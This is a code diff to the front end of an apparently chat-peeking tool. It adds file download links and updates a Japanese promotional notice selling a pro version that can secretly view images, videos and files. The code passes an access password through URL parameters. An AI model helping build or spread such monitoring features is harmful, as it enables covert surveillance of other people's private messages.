@@ -17,7 +17,7 @@ let logs = [
   {
     name: "ame_x@amex2189",
     content:
-      "@訪問者 \n お知らせ: 絵文字とスタンプ・アイコン・画像・背景に対応しました。良ければこのツールを広めてください！ \n Twitter (@amex2189) もフォローして頂けるとありがたいです。 \n プロ版を作りました！ \n 常時起動・画像・動画も覗き見等が出来ます。購入は https://honmono.ame-x.net まで！",
+      "@訪問者 \n お知らせ: 絵文字とスタンプ・アイコン・画像・動画・背景・ファイルに対応しました。良ければこのツールを広めてください！ \n Twitter (@amex2189) もフォローして頂けるとありがたいです。 \n プロ版を作りました！ \n 常時起動・画像・動画・ファイルも覗き見等が出来ます。購入は https://honmono.ame-x.net まで！",
     time: getCurrentTime(),
     raw: {
       sendBy: false,
@@ -47,12 +47,19 @@ function convertAtMentions(str) {
   return cols.join("\n");
 }
 
-function convertImage(msg, raw) {
+function convertObs(msg, raw) {
+
+  const pass = new URL(window.location.href).searchParams.get("pass");
+  
   if (raw.type === "image/video/location/unknown" && raw.msgId) {
     return `<img src="${
       api + "data?msgId=" + raw.msgId + "&pass=" +
-      new URL(window.location.href).searchParams.get("pass")
+      pass
     }" alt="画像を監視できるのは有料版のみです。" />`;
+  }else if (raw.type === "file" && raw.msgId) {
+    return pass ? `[File Link: <a class="${tw("underline")}" href="${
+      api + "data?msgId=" + raw.msgId + "&pass=" +
+      pass}">Donwload</a>]` : `[File Link:ファイルをダウンロードできるのはプロ版のみです。]`;
   }
 
   return msg;
@@ -306,7 +313,7 @@ function logComponent(log) {
             ),
             raw: log.content
               ? convertAtMentions(
-                convertImage(
+                convertObs(
                   convertStamp(
                     convertEmoji(escapeHtml(log.content), log.raw),
                     log.raw,
